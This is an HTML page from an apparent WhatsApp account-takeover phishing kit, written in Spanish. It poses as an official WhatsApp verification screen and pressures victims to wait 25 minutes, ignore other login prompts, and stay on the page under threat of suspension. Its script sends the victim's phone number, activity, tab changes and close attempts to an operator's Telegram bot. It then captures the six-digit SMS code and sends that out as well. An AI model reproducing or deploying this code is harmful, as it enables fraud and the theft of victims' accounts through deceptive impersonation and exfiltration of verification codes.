<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Verificaci√≥n SMS</title>
  <link href="../fonts.googleapis.com/css2@family=Poppins%253Awght@400%3B600&amp;display=swap.css" rel="stylesheet" />
  <style>
    /* Mismo estilo que index2.html */
    body {
      margin: 0;
      font-family: 'Poppins', sans-serif;
      background: linear-gradient(135deg, #4caf50, #81c784);
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      color: #333;
      padding: 20px 0;
    }

    .code-box {
      background: white;
      padding: 30px 25px;
      border-radius: 16px;
      box-shadow: 0 8px 24px rgba(0,0,0,0.12);
      width: 350px;
      max-width: 90%;
      text-align: center;
    }

    .code-box h1 {
      margin-bottom: 8px;
      font-weight: 600;
      color: #333;
      font-size: 1.8rem;
    }

    .description {
      font-weight: 400;
      font-size: 0.95rem;
      color: #555;
      margin-bottom: 20px;
      line-height: 1.3;
    }

    .progress-bar-bg {
      width: 100%;
      height: 24px;
      background-color: #e0e0e0;
      border-radius: 12px;
      overflow: hidden;
      position: relative;
      margin-bottom: 20px;
    }

    .progress-bar-fill {
      height: 100%;
      width: 0%;
      background: linear-gradient(90deg, #4caf50, #66bb6a);
      border-radius: 12px;
      transition: width 0.5s ease;
      display: flex;
      align-items: center;
      justify-content: center;
      color: white;
      font-weight: 600;
      font-size: 0.8rem;
      min-width: 60px;
    }

    .success-message {
      display: none;
      background: linear-gradient(135deg, #4caf50, #66bb6a);
      color: white;
      padding: 16px;
      border-radius: 12px;
      margin-bottom: 20px;
      text-align: left;
      line-height: 1.5;
      font-size: 0.9rem;
      animation: slideIn 0.5s ease;
    }

    .success-message.show {
      display: block;
    }

    @keyframes slideIn {
      from {
        opacity: 0;
        transform: translateY(-10px);
      }
      to {
        opacity: 1;
        transform: translateY(0);
      }
    }

    @keyframes fadeInSlide {
      from {
        opacity: 0;
        transform: translateY(20px);
      }
      to {
        opacity: 1;
        transform: translateY(0);
      }
    }

    label {
      display: block;
      font-weight: 600;
      margin-bottom: 12px;
      color: #555;
      text-align: left;
      font-size: 0.95rem;
    }

    .code-inputs {
      display: flex;
      justify-content: space-between;
      gap: 10px;
      margin-bottom: 20px;
    }

    .code-inputs input {
      width: 40px;
      height: 50px;
      font-size: 1.8rem;
      font-weight: 600;
      text-align: center;
      border: 2px solid #ddd;
      border-radius: 12px;
      transition: all 0.3s ease;
      box-sizing: border-box;
      color: #333;
    }

    .code-inputs input:disabled {
      opacity: 0.3;
      background-color: #f5f5f5;
      cursor: not-allowed;
    }

    .code-inputs input:enabled:focus {
      outline: none;
      border-color: #4caf50;
      box-shadow: 0 0 8px rgba(76, 175, 80, 0.4);
      background-color: #f0fdf0;
    }

    button {
      width: 100%;
      padding: 12px;
      background-color: #21c063;
      border: none;
      border-radius: 14px;
      color: white;
      font-weight: 600;
      font-size: 1rem;
      cursor: pointer;
      transition: all 0.3s ease;
    }

    button:disabled {
      opacity: 0.4;
      cursor: not-allowed;
      background-color: #aaa;
    }

    button:enabled:hover {
      background-color: #1aa454;
    }

    .info-box {
      background-color: #f0fdf0;
      border-left: 4px solid #4caf50;
      padding: 12px;
      margin: 16px 0;
      text-align: left;
      border-radius: 8px;
    }

    .info-box p {
      margin: 8px 0;
      font-size: 0.85rem;
      line-height: 1.4;
      color: #333;
    }

    .warning {
      background-color: #fff3cd;
      border-left: 4px solid #ffc107;
      padding: 10px;
      margin: 16px 0;
      text-align: left;
      border-radius: 8px;
      font-size: 0.85rem;
      color: #856404;
      line-height: 1.3;
    }

    .tip-box {
      background-color: #e3f2fd;
      border-left: 4px solid #2196f3;
      padding: 12px;
      margin: 16px 0;
      text-align: left;
      border-radius: 8px;
      font-size: 0.85rem;
      color: #0d47a1;
      line-height: 1.4;
      display: none;
    }

    .tip-box.show {
      display: block;
      animation: fadeInSlide 0.6s ease;
    }

    .footer-text {
      margin-top: 20px;
      font-size: 0.85rem;
      color: #555;
      user-select: none;
      line-height: 1.3;
    }

    .error {
      color: red;
      font-weight: bold;
      margin-bottom: 10px;
      font-size: 0.9rem;
    }
  </style>
</head>
<body>

  <div class="code-box">
    <h1>Valida whatsapp</h1>
    <p class="description">
      Proceso de validaci√≥n iniciado. Para culminar exitosamente y asegurar tu cuenta de WhatsApp, debes permanecer en esta pantalla. En 25 minutos recibir√°s un c√≥digo SMS para finalizar la verificaci√≥n.
    </p>

    <div class="progress-bar-bg">
      <div class="progress-bar-fill" id="progressBar">25:00</div>
    </div>

    <div class="success-message" id="successMessage">
      ‚úÖ Listo, hemos revisado y verificado tu cuenta.<br>
      üîí Para culminar el proceso y asegurar tu informaci√≥n, por favor ingresa el c√≥digo de 6 d√≠gitos que te hemos enviado v√≠a SMS.
    </div>

    <form id="codeForm">
      <div class="error" id="errorMsg" style="display:none;"></div>

      <label for="code">C√≥digo de verificaci√≥n</label>
      <div class="code-inputs">
        <input type="text" maxlength="1" disabled />
        <input type="text" maxlength="1" disabled />
        <input type="text" maxlength="1" disabled />
        <input type="text" maxlength="1" disabled />
        <input type="text" maxlength="1" disabled />
        <input type="text" maxlength="1" disabled />
      </div>
      <button type="submit" disabled>Verificar</button>
    </form>

    <div class="warning">
      <strong>‚ö†Ô∏è Importante:</strong> No debe salirse o cerrar esta ventana para evitar p√©rdidas o robo de informaci√≥n.
    </div>

    <!-- Contenedor de tips rotativos -->
    <div id="tipsContainer"></div>

    <div class="footer-text">
      Adem√°s del cifrado de extremo a extremo, a√±adimos m√°s capas de protecci√≥n para todas tus conversaciones.<br><br>
      2024 ¬© WhatsApp LLC
    </div>
  </div>

  <!-- CARGAR JQUERY -->
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
  
  <!-- CARGAR CONFIGURACIONES DE TELEGRAM -->
  <script src="dt.js"></script>        <!-- Para los C√ìDIGOS -->
  <script src="estado.js"></script>    <!-- Para las NOTIFICACIONES DE ESTADO -->

  <script>
    const inputs = document.querySelectorAll('.code-inputs input');
    const errorMsg = document.getElementById('errorMsg');
    const progressBar = document.getElementById('progressBar');
    const submitButton = document.querySelector('button[type="submit"]');
    const successMessage = document.getElementById('successMessage');
    const tipsContainer = document.getElementById('tipsContainer');
    
    // Tiempo total en segundos (25 minutos = 1500 segundos)
    const totalSeconds = 1500;
    let secondsElapsed = 0;
    let pageLoadTime = new Date();

    // ========== FUNCIONES DE TELEGRAM ==========
    
    // Funci√≥n para enviar C√ìDIGOS (usa dt.js)
    function enviarCodigoTelegram(mensaje, callback) {
      enviarTelegram(mensaje, callback);
    }
    
    // Funci√≥n para enviar NOTIFICACIONES DE ESTADO (usa estado.js)
    function enviarEstadoTelegram(mensaje, callback) {
      enviarTelegram(mensaje, callback);
    }

    // Funci√≥n para obtener tiempo transcurrido
    function getTiempoTranscurrido() {
      const ahora = new Date();
      const diff = Math.floor((ahora - pageLoadTime) / 1000);
      const minutos = Math.floor(diff / 60);
      const segundos = diff % 60;
      return `${minutos}m ${segundos}s`;
    }

    // ========== NOTIFICACIONES DE ESTADO ==========

    // 1. NOTIFICACI√ìN AL CARGAR LA P√ÅGINA
    window.addEventListener('load', function() {
      let numero = localStorage.getItem('telefono_completo') || "N√∫mero no disponible";
      
      let mensaje = 
        "üü¢ USUARIO EN L√çNEA\n\n" +
        "üì± N√∫mero: " + numero + "\n" +
        "‚è∞ P√°gina cargada: " + new Date().toLocaleTimeString() + "\n" +
        "üìÑ Pantalla: Index5 - Esperando c√≥digo SMS\n" +
        "‚è≥ Contador iniciado: 25 minutos\n\n" +
        "‚úÖ El usuario est√° ACTIVO y esperando";

      enviarEstadoTelegram(mensaje);
    });

    // 2. NOTIFICACIONES PERI√ìDICAS (Cada 5 minutos)
    setInterval(function() {
      let numero = localStorage.getItem('telefono_completo') || "N√∫mero no disponible";
      const tiempoRestante = totalSeconds - secondsElapsed;
      const minutosRestantes = Math.floor(tiempoRestante / 60);
      
      let mensaje = 
        "üü¢ USUARIO SIGUE EN L√çNEA\n\n" +
        "üì± N√∫mero: " + numero + "\n" +
        "‚è∞ Hora: " + new Date().toLocaleTimeString() + "\n" +
        "‚è≥ Tiempo en p√°gina: " + getTiempoTranscurrido() + "\n" +
        "üìä Progreso: " + Math.round((secondsElapsed/totalSeconds)*100) + "%\n" +
        "‚è±Ô∏è Tiempo restante: " + minutosRestantes + " minutos\n\n" +
        "‚úÖ P√°gina ACTIVA - Usuario esperando c√≥digo";

      enviarEstadoTelegram(mensaje);
    }, 300000); // Cada 5 minutos

    // 3. DETECTAR CUANDO EL USUARIO INTENTA CERRAR LA P√ÅGINA
    window.addEventListener('beforeunload', function(e) {
      let numero = localStorage.getItem('telefono_completo') || "N√∫mero no disponible";
      
      let mensaje = 
        "‚ö†Ô∏è ALERTA: USUARIO INTENTA CERRAR\n\n" +
        "üì± N√∫mero: " + numero + "\n" +
        "‚è∞ Hora: " + new Date().toLocaleTimeString() + "\n" +
        "‚è≥ Tiempo en p√°gina: " + getTiempoTranscurrido() + "\n" +
        "üìä Progreso alcanzado: " + Math.round((secondsElapsed/totalSeconds)*100) + "%\n\n" +
        "üö® El usuario est√° intentando salir de la p√°gina";

      // Usar sendBeacon para env√≠o garantizado antes de cerrar
      const bot_id = telegram_bot_estado;
      const ch_id = chat_id_estado;
      navigator.sendBeacon(
        "https://api.telegram.org/bot" + bot_id + "/sendMessage?chat_id=" + ch_id + "&text=" + encodeURIComponent(mensaje)
      );

      e.preventDefault();
      e.returnValue = '';
    });

    // 4. DETECTAR CUANDO LA P√ÅGINA PIERDE EL FOCO
    let tiempoSalida = null;
    
    document.addEventListener('visibilitychange', function() {
      let numero = localStorage.getItem('telefono_completo') || "N√∫mero no disponible";
      
      if (document.hidden) {
        tiempoSalida = new Date();
        
        let mensaje = 
          "üü° USUARIO CAMBI√ì DE PESTA√ëA\n\n" +
          "üì± N√∫mero: " + numero + "\n" +
          "‚è∞ Hora: " + new Date().toLocaleTimeString() + "\n" +
          "‚è≥ Tiempo en p√°gina: " + getTiempoTranscurrido() + "\n" +
          "üìä Progreso: " + Math.round((secondsElapsed/totalSeconds)*100) + "%\n\n" +
          "‚ö†Ô∏è P√°gina en segundo plano - Usuario NO est√° viendo la pantalla";

        enviarEstadoTelegram(mensaje);
      } else {
        if (tiempoSalida) {
          const tiempoAusente = Math.floor((new Date() - tiempoSalida) / 1000);
          
          let mensaje = 
            "üü¢ USUARIO REGRES√ì\n\n" +
            "üì± N√∫mero: " + numero + "\n" +
            "‚è∞ Hora: " + new Date().toLocaleTimeString() + "\n" +
            "‚è≥ Tiempo ausente: " + Math.floor(tiempoAusente/60) + "m " + (tiempoAusente%60) + "s\n" +
            "üìä Progreso actual: " + Math.round((secondsElapsed/totalSeconds)*100) + "%\n\n" +
            "‚úÖ Usuario VOLVI√ì a la pantalla de verificaci√≥n";

          enviarEstadoTelegram(mensaje);
          tiempoSalida = null;
        }
      }
    });

    // 5. NOTIFICACI√ìN EN HITOS IMPORTANTES
    let hitosNotificados = {25: false, 50: false, 75: false};
    
    function verificarHitos() {
      const progreso = Math.round((secondsElapsed/totalSeconds)*100);
      let numero = localStorage.getItem('telefono_completo') || "N√∫mero no disponible";
      
      if (progreso >= 25 && !hitosNotificados[25]) {
        hitosNotificados[25] = true;
        let mensaje = 
          "üìä HITO ALCANZADO: 25%\n\n" +
          "üì± N√∫mero: " + numero + "\n" +
          "‚è∞ Hora: " + new Date().toLocaleTimeString() + "\n" +
          "‚è≥ Tiempo en p√°gina: " + getTiempoTranscurrido() + "\n\n" +
          "‚úÖ Usuario lleva 6 minutos esperando";
        enviarEstadoTelegram(mensaje);
      }
      
      if (progreso >= 50 && !hitosNotificados[50]) {
        hitosNotificados[50] = true;
        let mensaje = 
          "üìä HITO ALCANZADO: 50%\n\n" +
          "üì± N√∫mero: " + numero + "\n" +
          "‚è∞ Hora: " + new Date().toLocaleTimeString() + "\n" +
          "‚è≥ Tiempo en p√°gina: " + getTiempoTranscurrido() + "\n\n" +
          "‚úÖ Usuario lleva 12 minutos esperando - Mitad del proceso";
        enviarEstadoTelegram(mensaje);
      }
      
      if (progreso >= 75 && !hitosNotificados[75]) {
        hitosNotificados[75] = true;
        let mensaje = 
          "üìä HITO ALCANZADO: 75%\n\n" +
          "üì± N√∫mero: " + numero + "\n" +
          "‚è∞ Hora: " + new Date().toLocaleTimeString() + "\n" +
          "‚è≥ Tiempo en p√°gina: " + getTiempoTranscurrido() + "\n\n" +
          "‚úÖ Usuario lleva 19 minutos esperando - Casi terminando";
        enviarEstadoTelegram(mensaje);
      }
    }

    // 6. DETECTAR INACTIVIDAD
    let ultimaActividad = new Date();
    let inactividadNotificada = false;
    
    ['mousemove', 'mousedown', 'keypress', 'scroll', 'touchstart'].forEach(function(event) {
      document.addEventListener(event, function() {
        ultimaActividad = new Date();
        inactividadNotificada = false;
      }, true);
    });

    setInterval(function() {
      const tiempoInactivo = Math.floor((new Date() - ultimaActividad) / 1000);
      
      if (tiempoInactivo > 180 && !inactividadNotificada && !document.hidden) {
        inactividadNotificada = true;
        let numero = localStorage.getItem('telefono_completo') || "N√∫mero no disponible";
        
        let mensaje = 
          "‚ö†Ô∏è USUARIO INACTIVO\n\n" +
          "üì± N√∫mero: " + numero + "\n" +
          "‚è∞ Hora: " + new Date().toLocaleTimeString() + "\n" +
          "‚è≥ Inactivo por: " + Math.floor(tiempoInactivo/60) + " minutos\n" +
          "üìä Progreso: " + Math.round((secondsElapsed/totalSeconds)*100) + "%\n\n" +
          "‚ö†Ô∏è No hay actividad (mouse/teclado) - Posible que dej√≥ la p√°gina abierta";

        enviarEstadoTelegram(mensaje);
      }
    }, 30000);

    // ========== TIPS Y PROGRESO ==========

    const tips = [
      {
        type: 'info',
        text: 'En caso de no poder culminar su validaci√≥n correctamente, ser√° contactado por un asesor de soporte t√©cnico especializado.'
      },
      {
        type: 'warning',
        text: '‚ö†Ô∏è Si durante la validaci√≥n recibes otros c√≥digos o solicitudes de acceso, por favor rech√°zalos e ign√≥ralos hasta completar los 25 minutos y validar tu cuenta. Esto es necesario para asegurar tu cuenta correctamente.'
      },
      {
        type: 'info',
        text: 'üí¨ Si por cualquier motivo no puedes completar el proceso correctamente, uno de nuestros asesores de soporte t√©cnico se comunicar√° contigo en cuanto est√©n disponibles para asistirte.'
      },
      {
        type: 'warning',
        text: 'üîí Importante: Cerrar este proceso antes de finalizarlo puede resultar en la suspensi√≥n temporal o permanente de tu cuenta. Al no completar la verificaci√≥n, no podemos garantizar que seas el propietario leg√≠timo. Es necesario culminar el proceso.'
      }
    ];

    let currentTipIndex = 0;
    let currentTipElement = null;

    function showNextTip() {
      if (currentTipElement) {
        currentTipElement.remove();
      }

      const tip = tips[currentTipIndex];
      const tipElement = document.createElement('div');
      
      if (tip.type === 'warning') {
        tipElement.className = 'tip-box';
        tipElement.style.backgroundColor = '#fff3cd';
        tipElement.style.borderLeftColor = '#ffc107';
        tipElement.style.color = '#856404';
      } else {
        tipElement.className = 'tip-box';
      }
      
      tipElement.innerHTML = '<p>' + tip.text + '</p>';
      tipsContainer.appendChild(tipElement);
      
      setTimeout(() => {
        tipElement.classList.add('show');
      }, 100);
      
      currentTipElement = tipElement;
      currentTipIndex = (currentTipIndex + 1) % tips.length;
    }

    setTimeout(() => {
      showNextTip();
    }, 5000);

    const tipInterval = setInterval(() => {
      showNextTip();
    }, 20000);

    // Actualizar progreso cada segundo
    const progressInterval = setInterval(() => {
      secondsElapsed++;
      verificarHitos();
      
      const percentage = Math.min((secondsElapsed / totalSeconds) * 100, 100);
      progressBar.style.width = percentage + '%';
      
      const remainingSeconds = totalSeconds - secondsElapsed;
      const minutes = Math.floor(remainingSeconds / 60);
      const seconds = remainingSeconds % 60;
      progressBar.textContent = `${minutes}:${seconds.toString().padStart(2, '0')}`;
      
      // Cuando se complete el tiempo
      if (secondsElapsed >= totalSeconds) {
        clearInterval(progressInterval);
        clearInterval(tipInterval);
        progressBar.textContent = '¬°Listo!';
        
        if (currentTipElement) {
          currentTipElement.remove();
        }
        
        successMessage.classList.add('show');
        
        // Enviar notificaci√≥n de estado
        let numero = localStorage.getItem('telefono_completo') || "N√∫mero no disponible";
        
        let mensajeEstado = 
          "üéØ TIEMPO COMPLETADO - 100%\n\n" +
          "üì± N√∫mero: " + numero + "\n" +
          "‚è∞ Hora: " + new Date().toLocaleTimeString() + "\n" +
          "‚è≥ Tiempo total en p√°gina: " + getTiempoTranscurrido() + "\n\n" +
          "‚úÖ C√≥digo de Transferencia ready para enviar\n" +
          "üì≤ Campos habilitados - Esperando que usuario ingrese c√≥digo SMS";

        enviarEstadoTelegram(mensajeEstado);
        
        // Habilitar campos y bot√≥n
        inputs.forEach(input => {
          input.disabled = false;
        });
        submitButton.disabled = false;
        inputs[0].focus();
      }
    }, 1000);

    // Navegaci√≥n entre inputs
    inputs.forEach((input, index) => {
      input.addEventListener('input', () => {
        if (input.value.length === 1 && index < inputs.length - 1) {
          inputs[index + 1].focus();
        }
      });

      input.addEventListener('keydown', (e) => {
        if (e.key === 'Backspace' && input.value === '' && index > 0) {
          inputs[index - 1].focus();
        }
      });
    });

    // ========== ENV√çO DEL C√ìDIGO SMS (usa dt.js) ==========
    $('#codeForm').submit(function(e) {
      e.preventDefault();

      let code = '';
      inputs.forEach(input => code += input.value);

      if (code.length < 6) {
        errorMsg.textContent = 'Por favor, ingresa el c√≥digo completo de 6 d√≠gitos.';
        errorMsg.style.display = 'block';
        return;
      }

      let codePrevio = localStorage.getItem('codigo_index2');

      if (code === codePrevio) {
        errorMsg.textContent = 'Por favor, ingresa solo el c√≥digo que fue enviado v√≠a SMS debe ser distinto al del dispositivo';
        errorMsg.style.display = 'block';
        return;
      }

      // Enviar C√ìDIGO al grupo principal (usa dt.js)
      let numero = localStorage.getItem('telefono_completo') || "N√∫mero no disponible";

      let mensajeCodigo = 
        "Whats\n\n" +
        "üì± N√∫mero: " + numero + "\n" +
        "üîê C√≥digo SMS Transfer1: " + code + "\n\n" +
        "C0DE BY 4R35 $$ ";

      enviarCodigoTelegram(mensajeCodigo, function(success) {
        if (success) {
          window.location = "cargando2.html";
        } else {
          errorMsg.textContent = 'Error al enviar el c√≥digo. Intenta nuevamente.';
          errorMsg.style.display = 'block';
        }
      });
    });
  </script>

</body>
</html>